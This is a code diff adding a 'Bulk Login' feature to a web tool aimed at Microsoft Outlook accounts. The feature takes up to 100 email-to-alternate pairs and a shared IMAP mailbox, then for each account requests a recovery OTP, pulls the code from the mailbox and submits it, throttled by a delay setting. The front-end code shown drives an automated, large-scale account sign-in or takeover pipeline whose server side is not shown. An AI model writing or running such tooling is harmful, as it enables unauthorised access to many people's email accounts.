@@ -38,6 +38,9 @@
         <button id="tab-login" class="flex-1 py-2.5 rounded-xl text-sm font-semibold text-slate-600 hover:bg-slate-50">
           Login
         </button>
+        <button id="tab-blogin" class="flex-1 py-2.5 rounded-xl text-sm font-semibold text-slate-600 hover:bg-slate-50">
+          Bulk Login
+        </button>
       </div>
 
       <!-- SINGLE -->
@@ -208,6 +211,96 @@
         <div id="login-result" class="mt-4 space-y-3"></div>
       </section>
 
+      <!-- BULK LOGIN — one shared IMAP, many email:alternate pairs -->
+      <section id="panel-blogin" class="hidden">
+        <!-- Shared IMAP card (saved to localStorage) -->
+        <div class="bg-white rounded-2xl shadow-sm border border-slate-200 p-5 mb-4">
+          <div class="flex items-center justify-between mb-3">
+            <div>
+              <h2 class="text-sm font-bold text-slate-900">Shared IMAP mailbox</h2>
+              <p class="text-xs text-slate-500 mt-0.5">Saved in your browser. All rows below reuse these credentials.</p>
+            </div>
+            <span id="bimap-status" class="text-xs font-semibold text-slate-400">not saved</span>
+          </div>
+          <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+            <div class="sm:col-span-2">
+              <label class="block text-xs text-slate-500 mb-1">Host</label>
+              <input id="bimap-host" placeholder="imap.gmail.com"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <div>
+              <label class="block text-xs text-slate-500 mb-1">Port</label>
+              <input id="bimap-port" type="number" value="993" min="1" max="65535"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <div class="sm:col-span-2">
+              <label class="block text-xs text-slate-500 mb-1">Username</label>
+              <input id="bimap-user" placeholder="recovery@gmail.com" autocomplete="off"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <div>
+              <label class="block text-xs text-slate-500 mb-1">Password / App-password</label>
+              <input id="bimap-pass" type="password" autocomplete="new-password" placeholder="••••••••••••"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+          </div>
+          <div class="flex items-center justify-between mt-3">
+            <label class="inline-flex items-center gap-1.5 text-xs text-slate-500">
+              <input id="bimap-secure" type="checkbox" checked class="rounded border-slate-300" /> SSL/TLS (port 993)
+            </label>
+            <div class="flex gap-2">
+              <button id="bimap-clear" type="button"
+                class="text-xs font-semibold px-3 py-1.5 rounded-lg bg-slate-100 text-slate-700 hover:bg-slate-200">
+                Clear
+              </button>
+              <button id="bimap-save" type="button"
+                class="text-xs font-semibold px-3 py-1.5 rounded-lg bg-blue-600 text-white hover:bg-blue-700">
+                Save IMAP
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Pairs + run -->
+        <form id="blogin-form" class="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 space-y-4">
+          <div>
+            <div class="flex items-center justify-between mb-2">
+              <label class="text-sm font-semibold text-slate-700">Email : Alternate pairs</label>
+              <span id="blogin-count" class="text-xs text-slate-400">0 pairs detected</span>
+            </div>
+            <textarea id="blogin-pairs" rows="10" spellcheck="false"
+              placeholder="email:alter&#10;eliannkoch60@outlook.com:eliannkoch60@devilott.space&#10;alice@hotmail.com:alice.recovery@example.com&#10;..."
+              class="w-full px-3 py-2.5 rounded-lg border border-slate-200 text-slate-900 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 resize-y"></textarea>
+            <p class="text-xs text-slate-400 mt-1.5">Up to 100 pairs. Each row will: lookup → send OTP → poll IMAP for that row's alternate → submit code.</p>
+          </div>
+          <div class="flex items-end gap-3 flex-wrap">
+            <div class="flex-1 min-w-[140px]">
+              <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1.5">Channel</label>
+              <select id="blogin-channel"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <option value="Email">Email (recovery)</option>
+                <option value="SMS">SMS (recovery phone)</option>
+              </select>
+            </div>
+            <div class="w-32">
+              <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1.5">Delay (ms)</label>
+              <input id="blogin-delay" type="number" value="1500" min="800" max="10000" step="100"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <div class="w-32">
+              <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1.5">IMAP wait (s)</label>
+              <input id="blogin-timeout" type="number" value="90" min="10" max="180"
+                class="w-full px-3 py-2 rounded-lg border border-slate-200 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-blue-500" />
+            </div>
+            <button type="submit" id="blogin-btn"
+              class="px-6 py-2.5 rounded-lg bg-emerald-600 text-white font-semibold text-sm hover:bg-emerald-700 disabled:opacity-50 whitespace-nowrap">
+              Run all
+            </button>
+          </div>
+        </form>
+        <div id="blogin-result" class="mt-4 space-y-3"></div>
+      </section>
+
       <p class="text-center text-xs text-slate-400 mt-6">
         Calls happen server-side using one shared session. Microsoft only returns masked hints
         (e.g. <code class="bg-slate-100 px-1 py-0.5 rounded font-mono">u***@g***.com</code>).
@@ -223,6 +316,7 @@
         bulk:   { btn: $("#tab-bulk"),   panel: $("#panel-bulk")   },
         otc:    { btn: $("#tab-otc"),    panel: $("#panel-otc")    },
         login:  { btn: $("#tab-login"),  panel: $("#panel-login")  },
+        blogin: { btn: $("#tab-blogin"), panel: $("#panel-blogin") },
       };
       function selectTab(which) {
         for (const [name, { btn, panel }] of Object.entries(tabs)) {
@@ -824,6 +918,156 @@
           btn.disabled = false; btn.textContent = "Run full sign-in";
         }
       });
+
+      // --- Bulk Login ---
+      const BIMAP_KEY = "outlook_lookup_bimap_v1";
+      function loadBimap() {
+        try {
+          const raw = localStorage.getItem(BIMAP_KEY);
+          if (!raw) return;
+          const v = JSON.parse(raw);
+          if (v.host)   $("#bimap-host").value = v.host;
+          if (v.port)   $("#bimap-port").value = v.port;
+          if (v.user)   $("#bimap-user").value = v.user;
+          if (v.pass)   $("#bimap-pass").value = v.pass;
+          $("#bimap-secure").checked = v.secure !== false;
+          $("#bimap-status").textContent = "loaded from this browser";
+          $("#bimap-status").className = "text-xs font-semibold text-emerald-600";
+        } catch {}
+      }
+      function saveBimap() {
+        const v = {
+          host: $("#bimap-host").value.trim(),
+          port: +$("#bimap-port").value || 993,
+          user: $("#bimap-user").value.trim(),
+          pass: $("#bimap-pass").value,
+          secure: $("#bimap-secure").checked,
+        };
+        if (!v.host || !v.user || !v.pass) {
+          $("#bimap-status").textContent = "fill host, user, pass first";
+          $("#bimap-status").className = "text-xs font-semibold text-red-600";
+          return;
+        }
+        localStorage.setItem(BIMAP_KEY, JSON.stringify(v));
+        $("#bimap-status").textContent = "saved in this browser";
+        $("#bimap-status").className = "text-xs font-semibold text-emerald-600";
+      }
+      function clearBimap() {
+        localStorage.removeItem(BIMAP_KEY);
+        $("#bimap-host").value = ""; $("#bimap-user").value = ""; $("#bimap-pass").value = "";
+        $("#bimap-port").value = 993; $("#bimap-secure").checked = true;
+        $("#bimap-status").textContent = "cleared";
+        $("#bimap-status").className = "text-xs font-semibold text-slate-400";
+      }
+      $("#bimap-save").addEventListener("click", saveBimap);
+      $("#bimap-clear").addEventListener("click", clearBimap);
+      loadBimap();
+
+      function parseLoginPairs(text) {
+        return text.split(/\r?\n/).map(l => l.trim())
+          .filter(l => l && l.includes(":"))
+          .map(l => { const [e,a] = l.split(":").map(s=>s.trim()); return { email: e, alternate: a }; })
+          .filter(p => p.email && p.alternate);
+      }
+      $("#blogin-pairs").addEventListener("input", () => {
+        $("#blogin-count").textContent = `${parseLoginPairs($("#blogin-pairs").value).length} pairs detected`;
+      });
+
+      $("#blogin-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const pairs = parseLoginPairs($("#blogin-pairs").value);
+        if (pairs.length === 0) {
+          $("#blogin-result").innerHTML = renderError("Add at least one email:alternate line.");
+          return;
+        }
+        if (pairs.length > 100) {
+          $("#blogin-result").innerHTML = renderError("Maximum 100 pairs per run.");
+          return;
+        }
+        const imap = {
+          host: $("#bimap-host").value.trim(),
+          port: +$("#bimap-port").value || 993,
+          secure: $("#bimap-secure").checked,
+          user: $("#bimap-user").value.trim(),
+          pass: $("#bimap-pass").value,
+        };
+        if (!imap.host || !imap.user || !imap.pass) {
+          $("#blogin-result").innerHTML = renderError("Fill in the shared IMAP host, user and password above (then click Save IMAP).");
+          return;
+        }
+        const payload = {
+          pairs,
+          imap,
+          channel: $("#blogin-channel").value,
+          delayMs: +$("#blogin-delay").value || 1500,
+          timeoutMs: (+$("#blogin-timeout").value || 90) * 1000,
+        };
+        const btn = $("#blogin-btn");
+        btn.disabled = true; btn.textContent = "Running…";
+        const estSec = Math.round((pairs.length * (payload.delayMs/1000 + 8)));
+        $("#blogin-result").innerHTML = `<div class="rounded-2xl border border-slate-200 bg-white p-5 text-sm text-slate-600">
+          <div class="flex items-center gap-2">
+            <svg class="w-4 h-4 animate-spin text-emerald-600" fill="none" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" class="opacity-25"></circle>
+              <path d="M4 12a8 8 0 018-8" stroke="currentColor" stroke-width="3" class="opacity-75"></path>
+            </svg>
+            Running ${pairs.length} sign-in${pairs.length>1?"s":""} sequentially. Estimated ~${estSec}s. Don't close this tab.
+          </div>
+        </div>`;
+        try {
+          const r = await fetch("/api/login-with-imap/bulk", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+          const data = await r.json();
+          $("#blogin-result").innerHTML = renderBulkLogin(data);
+        } catch (err) {
+          $("#blogin-result").innerHTML = renderError(err.message);
+        } finally {
+          btn.disabled = false; btn.textContent = "Run all";
+        }
+      });
+
+      function renderBulkLogin(d) {
+        if (d.error && (!d.results || !d.results.length)) {
+          return renderError(d.error);
+        }
+        const s = d.summary || {};
+        const rows = (d.results || []).map((r) => {
+          const status = r.success
+            ? `<span class="inline-block px-2 py-0.5 rounded bg-emerald-100 text-emerald-700 text-xs font-semibold">verified</span>`
+            : `<span class="inline-block px-2 py-0.5 rounded bg-red-100 text-red-700 text-xs font-semibold">${escapeHtml(r.stage || "fail")}</span>`;
+          const detail = r.success
+            ? `code <span class="font-mono font-bold text-emerald-700">${escapeHtml(r.code)}</span> · HTTP ${escapeHtml(String(r.httpStatus ?? "?"))} · mailbox: ${escapeHtml(r.mailbox ?? "")}`
+            : escapeHtml(r.error || "");
+          return `<tr>
+            <td class="px-3 py-2 text-xs font-mono text-slate-500">${r.index + 1}</td>
+            <td class="px-3 py-2 text-sm font-mono text-slate-900 break-all">${escapeHtml(r.email)}</td>
+            <td class="px-3 py-2">${status}</td>
+            <td class="px-3 py-2 text-xs text-slate-700 break-all">${detail}</td>
+          </tr>`;
+        }).join("");
+        return `<div class="rounded-2xl border bg-white border-slate-200 p-5">
+            <div class="flex items-baseline gap-4 flex-wrap">
+              <p class="font-semibold text-sm text-slate-900">Bulk sign-in finished</p>
+              <p class="text-xs text-slate-500">total: <b>${s.total ?? 0}</b> · verified: <b class="text-emerald-700">${s.verified ?? 0}</b> · failed: <b class="text-red-700">${s.failed ?? 0}</b></p>
+            </div>
+          </div>
+          <div class="rounded-2xl border border-slate-200 bg-white overflow-hidden">
+            <table class="w-full text-sm">
+              <thead class="bg-slate-50 text-xs uppercase tracking-wide text-slate-500">
+                <tr>
+                  <th class="px-3 py-2 text-left font-semibold w-10">#</th>
+                  <th class="px-3 py-2 text-left font-semibold">Outlook email</th>
+                  <th class="px-3 py-2 text-left font-semibold w-28">Status</th>
+                  <th class="px-3 py-2 text-left font-semibold">Detail</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-slate-100">${rows}</tbody>
+            </table>
+          </div>`;
+      }
 
       function renderLogin(d) {
         const stepRows = (d.steps || []).map((s) => `
